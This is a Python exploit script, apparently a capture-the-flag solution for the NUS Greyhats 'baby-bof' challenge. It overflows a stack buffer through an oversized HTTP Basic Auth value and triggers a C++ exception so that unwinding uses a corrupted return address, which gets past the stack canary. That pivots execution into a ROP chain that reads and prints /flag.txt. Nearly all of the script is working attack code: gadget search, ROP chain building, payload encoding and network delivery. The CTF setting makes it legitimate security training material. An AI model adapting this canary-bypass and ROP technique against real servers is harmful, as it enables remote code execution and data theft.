#!/usr/bin/env python3
"""
Readable exploit for NUS Greyhats baby-bof.

Idea
----
The CGI binary decodes the HTTP Basic Auth value into a fixed-size stack buffer.
The decoder does not enforce an output limit, so we can overflow the stack.

A normal ret2rop does not work because validate_auth() is protected by a stack
canary. The trick is:

1. overflow the stack anyway
2. overwrite saved RBP / saved RIP
3. append an invalid base64 character so decode_base64() throws an exception
4. let C++ exception unwinding use our corrupted saved RIP as the unwind
   call-site, which pivots execution into our ROP chain on the stack

The ROP chain prints a valid CGI header, opens /flag.txt, reads it, writes it
to stdout, then calls _exit(0) so lighttpd does not return HTTP 500.
"""

from __future__ import annotations

import argparse
import base64
import os
import pathlib
import re
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
from dataclasses import dataclass, replace
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xffffffffffffffff)


FLAG_RE = re.compile(rb"(?:grey|flag|ctf|nusgreyhats)\{[^}\r\n\x00]{1,200}\}", re.I)

# Stack layout inside validate_auth()
OFFSET_TO_SAVED_RBP = 0x110
OFFSET_TO_SAVED_RIP = 0x118
OFFSET_TO_ROP_CHAIN = 0x158


# ---------------------------------------------------------------------------
# Exploit profile
# ---------------------------------------------------------------------------

@dataclass
class ExploitProfile:
    # Gadgets
    pop_rdi: int
    pop_rsi: int
    pop_rdx_rbx: int

    # Syscall wrappers / libc functions inside the static binary
    open_addr: int
    read_addr: int
    write_addr: int
    exit_addr: int

    # Useful static data
    path_flag: int
    header: int
    bss: int
    fake_rbp: int

    # Candidate RIPs used during exception unwinding
    unwind_rips: Tuple[int, ...]


# Fallback profile for the normal challenge build.
DEFAULT_PROFILE = ExploitProfile(
    pop_rdi=0x402514,
    pop_rsi=0x401cde,
    pop_rdx_rbx=0x482677,
    open_addr=0x44dfe0,
    read_addr=0x44e070,
    write_addr=0x44e0b0,
    exit_addr=0x44d6f0,
    path_flag=0x490131,
    header=0x4900fb,
    bss=0x4ca760,
    fake_rbp=0x4caf60,
    unwind_rips=(0x4086e0, 0x4086dc, 0x4086df),
)


# ---------------------------------------------------------------------------
# Minimal ELF helper
# ---------------------------------------------------------------------------

class SimpleELF:
    """
    Very small ELF helper.

    We only need:
      - executable segment ranges
      - symbol lookup via `nm`
      - searching bytes in the file / mapped VA space
      - locating a useful unwind RIP
    """

    def __init__(self, path: pathlib.Path):
        self.path = path
        self.data = path.read_bytes()

        if self.data[:4] != b"\x7fELF" or self.data[4] != 2 or self.data[5] != 1:
            raise ValueError(f"{path} is not a little-endian ELF64")

        self.program_headers = self._parse_program_headers()
        self.symbols = self._load_symbols()

    def _parse_program_headers(self):
        e_phoff = struct.unpack_from("<Q", self.data, 0x20)[0]
        e_phentsize = struct.unpack_from("<H", self.data, 0x36)[0]
        e_phnum = struct.unpack_from("<H", self.data, 0x38)[0]

        headers = []
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type, p_flags = struct.unpack_from("<II", self.data, off)
            p_offset, p_vaddr = struct.unpack_from("<QQ", self.data, off + 8)
            p_filesz = struct.unpack_from("<Q", self.data, off + 32)[0]
            headers.append((p_type, p_flags, p_offset, p_vaddr, p_filesz))
        return headers

    def _load_symbols(self) -> Dict[str, int]:
        if shutil.which("nm") is None:
            return {}

        result = subprocess.run(
            ["nm", "-n", str(self.path)],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
        )

        symbols: Dict[str, int] = {}
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 3 and re.fullmatch(r"[0-9a-fA-F]+", parts[0]):
                symbols[parts[2]] = int(parts[0], 16)
        return symbols

    def file_offset_to_vaddr(self, file_off: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.program_headers:
            if p_type == 1 and p_off <= file_off < p_off + p_size:
                return p_va + (file_off - p_off)
        raise ValueError(f"file offset {file_off:#x} is not mapped")

    def vaddr_to_file_offset(self, va: int) -> int:
        for p_type, _flags, p_off, p_va, p_size in self.program_headers:
            if p_type == 1 and p_va <= va < p_va + p_size:
                return p_off + (va - p_va)
        raise ValueError(f"vaddr {va:#x} is not mapped")

    def executable_ranges(self):
        for p_type, flags, p_off, p_va, p_size in self.program_headers:
            if p_type == 1 and (flags & 1):
                yield p_off, p_off + p_size, p_va

    def get_symbol(self, *names: str) -> int:
        for name in names:
            if name in self.symbols:
                return self.symbols[name]
        raise KeyError("missing symbol: " + " / ".join(names))

    def find_bytes_vaddr(self, needle: bytes) -> int:
        off = self.data.find(needle)
        if off < 0:
            raise ValueError(f"could not find {needle!r}")
        return self.file_offset_to_vaddr(off)

    def find_gadget(self, needle: bytes) -> int:
        for start, end, base_va in self.executable_ranges():
            hit = self.data.find(needle, start, end)
            if hit >= 0:
                return base_va + (hit - start)
        raise ValueError(f"could not find gadget {needle.hex()}")

    def find_unwind_rip(self) -> int:
        """
        Find a return address that works well during C++ exception unwinding.

        We look for a pattern inside std::string::reserve() where unwinding lands
        with rsp still pointing into attacker-controlled stack data.
        """
        call_prefix = b"\x31\xd2\x48\x89\xee\xe8"
        expected_suffix = b"\x48\x8b\x13\x48\x8d\x7a\xe8"

        candidate_ranges = []
        if "_ZNSs7reserveEv" in self.symbols:
            start = self.vaddr_to_file_offset(self.symbols["_ZNSs7reserveEv"])
            candidate_ranges.append((start, 0x200))

        for start, end, _ in self.executable_ranges():
            candidate_ranges.append((start, end - start))

        for start, size in candidate_ranges:
            blob = self.data[start:start + size]
            search_from = 0
            while True:
                idx = blob.find(call_prefix, search_from)
                if idx < 0:
                    break

                ret_file_off = start + idx + 10
                if self.data[ret_file_off:ret_file_off + len(expected_suffix)] == expected_suffix:
                    return self.file_offset_to_vaddr(ret_file_off)

                search_from = idx + 1

        raise ValueError("could not auto-find unwind RIP")


# ---------------------------------------------------------------------------
# Profile building
# ---------------------------------------------------------------------------

def profile_from_elf(elf_path: pathlib.Path, unwind_override: Optional[int]) -> ExploitProfile:
    elf = SimpleELF(elf_path)

    bss_start = elf.symbols.get("__bss_start", DEFAULT_PROFILE.bss)
    bss_end = elf.symbols.get("_end", bss_start + 0x8000)

    # Pick a clean writable area in .bss for the flag buffer and fake frame.
    bss_mid = (bss_start + min(0x4500, max(0x100, (bss_end - bss_start) // 2))) & ~0xF

    unwind_rip = unwind_override if unwind_override is not None else elf.find_unwind_rip()

    return ExploitProfile(
        pop_rdi=elf.find_gadget(b"\x5f\xc3"),         # pop rdi ; ret
        pop_rsi=elf.find_gadget(b"\x5e\xc3"),         # pop rsi ; ret
        pop_rdx_rbx=elf.find_gadget(b"\x5a\x5b\xc3"), # pop rdx ; pop rbx ; ret
        open_addr=elf.get_symbol("open", "__libc_open", "__open"),
        read_addr=elf.get_symbol("read", "__libc_read", "__read"),
        write_addr=elf.get_symbol("write", "__libc_write", "__write"),
        exit_addr=elf.get_symbol("_exit"),
        path_flag=elf.find_bytes_vaddr(b"/flag.txt\x00"),
        header=elf.find_bytes_vaddr(b"Content-Type: text/plain\n"),
        bss=bss_mid,
        fake_rbp=bss_mid + 0x800,
        unwind_rips=(unwind_rip,),
    )


def try_extract_elf_from_docker(challenge_dir: pathlib.Path) -> Optional[pathlib.Path]:
    if shutil.which("docker") is None or not (challenge_dir / "Dockerfile").exists():
        return None

    temp_dir = pathlib.Path(tempfile.mkdtemp(prefix="baby_bof_extract_"))
    out_path = temp_dir / "index.cgi"
    tag = "baby-bof-extract-local"

    print(f"[+] building Docker image from {challenge_dir}", file=sys.stderr)
    image_id = subprocess.check_output(
        ["docker", "build", "-q", "-t", tag, str(challenge_dir)],
        text=True,
    ).strip()

    container_id = subprocess.check_output(["docker", "create", image_id], text=True).strip()
    try:
        subprocess.check_call(
            ["docker", "cp", f"{container_id}:/var/www/html/index.cgi", str(out_path)],
            stdout=subprocess.DEVNULL,
        )
    finally:
        subprocess.call(["docker", "rm", container_id], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"[+] extracted ELF: {out_path}", file=sys.stderr)
    return out_path


def try_compile_local_elf(challenge_dir: pathlib.Path) -> Optional[pathlib.Path]:
    if shutil.which("g++") is None or not (challenge_dir / "index.cpp").exists():
        return None

    temp_dir = pathlib.Path(tempfile.mkdtemp(prefix="baby_bof_compile_"))
    out_path = temp_dir / "index.cgi"

    print(f"[+] compiling {challenge_dir / 'index.cpp'}", file=sys.stderr)
    subprocess.check_call([
        "g++",
        "-std=c++17",
        "-static",
        "-o", str(out_path),
        "-fstack-protector-strong",
        "-no-pie",
        str(challenge_dir / "index.cpp"),
    ])
    return out_path


def find_index_elf(args) -> Optional[pathlib.Path]:
    if args.elf:
        return pathlib.Path(args.elf)

    search_dirs: List[pathlib.Path] = []
    if args.docker_dir:
        challenge_dir = pathlib.Path(args.docker_dir)
        if not challenge_dir.exists() and pathlib.Path("Dockerfile").exists():
            print(f"[!] {challenge_dir} does not exist, using current directory instead", file=sys.stderr)
            challenge_dir = pathlib.Path(".")
        search_dirs.append(challenge_dir)
    else:
        search_dirs.append(pathlib.Path("."))

    for challenge_dir in search_dirs:
        if (challenge_dir / "index.cgi").exists():
            return challenge_dir / "index.cgi"

        elf = try_extract_elf_from_docker(challenge_dir)
        if elf is not None:
            return elf

        elf = try_compile_local_elf(challenge_dir)
        if elf is not None:
            return elf

    return None


# ---------------------------------------------------------------------------
# ROP and payload building
# ---------------------------------------------------------------------------

def build_rop_chain(profile: ExploitProfile) -> bytes:
    chain: List[int] = []

    def write_to_stdout(addr: int, size: int) -> None:
        chain.extend([
            profile.pop_rdi, 1,
            profile.pop_rsi, addr,
            profile.pop_rdx_rbx, size, 0,
            profile.write_addr,
        ])

    # Print valid CGI header: "Content-Type: text/plain\n\n"
    header_len = len(b"Content-Type: text/plain\n")
    write_to_stdout(profile.header, header_len)
    write_to_stdout(profile.header + header_len - 1, 1)

    # open("/flag.txt", O_RDONLY)
    chain.extend([
        profile.pop_rdi, profile.path_flag,
        profile.pop_rsi, 0,
        profile.open_addr,
    ])

    # read(3, bss, 0x80)
    chain.extend([
        profile.pop_rdi, 3,
        profile.pop_rsi, profile.bss,
        profile.pop_rdx_rbx, 0x80, 0,
        profile.read_addr,
    ])

    # write(1, bss, 0x80)
    chain.extend([
        profile.pop_rdi, 1,
        profile.pop_rsi, profile.bss,
        profile.pop_rdx_rbx, 0x80, 0,
        profile.write_addr,
    ])

    # _exit(0)
    chain.extend([
        profile.pop_rdi, 0,
        profile.exit_addr,
    ])

    return b"".join(p64(x) for x in chain)


def build_basic_auth(profile: ExploitProfile, unwind_rip: int) -> str:
    """
    Build the overflowing Basic Auth value.

    Layout of decoded bytes:
      [ admin:AAAA... ][ overwrite saved RBP ][ overwrite saved RIP ][ ROP chain ]

    After the base64 text we append '@AAA'. '@' is not valid base64, so
    decode_base64() throws only after it has already written the overflow.
    """
    decoded = bytearray(b"A" * OFFSET_TO_ROP_CHAIN + build_rop_chain(profile))
    decoded[:6] = b"admin:"

    decoded[OFFSET_TO_SAVED_RBP:OFFSET_TO_SAVED_RBP + 8] = p64(profile.fake_rbp)
    decoded[OFFSET_TO_SAVED_RIP:OFFSET_TO_SAVED_RIP + 8] = p64(unwind_rip)

    # Avoid '=' padding because the decoder validates padding before finishing
    # the whole decode. We want the invalid character to be the thing that throws.
    while len(decoded) % 3:
        decoded += b"P"

    encoded = base64.b64encode(decoded).decode()
    return "Basic " + encoded + "@AAA"


# ---------------------------------------------------------------------------
# I/O helpers
# ---------------------------------------------------------------------------

def send_http_request(host: str, port: int, auth: str, timeout: float) -> bytes:
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: baby-bof-readable\r\n"
        f"Authorization: {auth}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)

        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)

    return b"".join(chunks)


def run_local_cgi(cgi_path: pathlib.Path, auth: str, timeout: float) -> bytes:
    env = os.environ.copy()
    env["HTTP_AUTHORIZATION"] = auth

    proc = subprocess.run(
        [str(cgi_path)],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
    )

    output = proc.stdout
    if proc.stderr:
        output += b"\n[stderr]\n" + proc.stderr
    return output


# ---------------------------------------------------------------------------
# Pretty printing / parsing
# ---------------------------------------------------------------------------

def parse_int(text: Optional[str]) -> Optional[int]:
    return None if text is None else int(text, 0)


def dump_profile(profile: ExploitProfile) -> None:
    print("[+] exploit profile", file=sys.stderr)
    for field in [
        "pop_rdi", "pop_rsi", "pop_rdx_rbx",
        "open_addr", "read_addr", "write_addr", "exit_addr",
        "path_flag", "header", "bss", "fake_rbp",
    ]:
        print(f"    {field:12s} = {getattr(profile, field):#x}", file=sys.stderr)

    rip_list = ", ".join(hex(x) for x in profile.unwind_rips)
    print(f"    unwind_rips  = {rip_list}", file=sys.stderr)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(description="Readable exploit for baby-bof")
    parser.add_argument("host", nargs="?", default="challs.nusgreyhats.org")
    parser.add_argument("port", nargs="?", type=int, default=32367)

    parser.add_argument("--elf", help="use addresses from an existing index.cgi")
    parser.add_argument("--docker-dir", help="challenge directory containing Dockerfile / index.cpp")
    parser.add_argument("--no-auto-elf", action="store_true", help="skip ELF auto-profiling and use fallback addresses")
    parser.add_argument("--local-cgi", help="run against a local CGI binary instead of TCP")
    parser.add_argument("--unwind-rip", help="override the unwind RIP manually, e.g. 0x4086e0")
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument("--dump-auth", action="store_true", help="only print the final Authorization header")
    parser.add_argument("--verbose", action="store_true")

    args = parser.parse_args()

    unwind_override = parse_int(args.unwind_rip)

    profile = replace(
        DEFAULT_PROFILE,
        unwind_rips=(unwind_override,) if unwind_override is not None else DEFAULT_PROFILE.unwind_rips,
    )

    if not args.no_auto_elf:
        try:
            elf_path = find_index_elf(args)
            if elf_path is not None:
                profile = profile_from_elf(elf_path, unwind_override)
                if args.verbose:
                    print(f"[+] using ELF profile from {elf_path}", file=sys.stderr)
        except Exception as exc:
            print(f"[!] auto-profile failed: {exc}; using fallback profile", file=sys.stderr)

    if args.verbose:
        dump_profile(profile)

    last_response = b""

    for unwind_rip in profile.unwind_rips:
        print(f"[+] trying unwind RIP {unwind_rip:#x}", file=sys.stderr)

        auth = build_basic_auth(profile, unwind_rip)

        if args.dump_auth:
            print(auth)
            return 0

        if args.local_cgi:
            response = run_local_cgi(pathlib.Path(args.local_cgi), auth, args.timeout)
        else:
            response = send_http_request(args.host, args.port, auth, args.timeout)

        last_response = response

        match = FLAG_RE.search(response)
        if match:
            print(match.group(0).decode(errors="replace"))
            return 0

        # If regex misses but our CGI header worked, show the raw body anyway.
        if b"500 Internal" not in response and b"Content-Type: text/plain" in response:
            sys.stdout.buffer.write(response)
            return 0

    print("[-] no flag found; last response follows", file=sys.stderr)
    sys.stdout.buffer.write(last_response)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
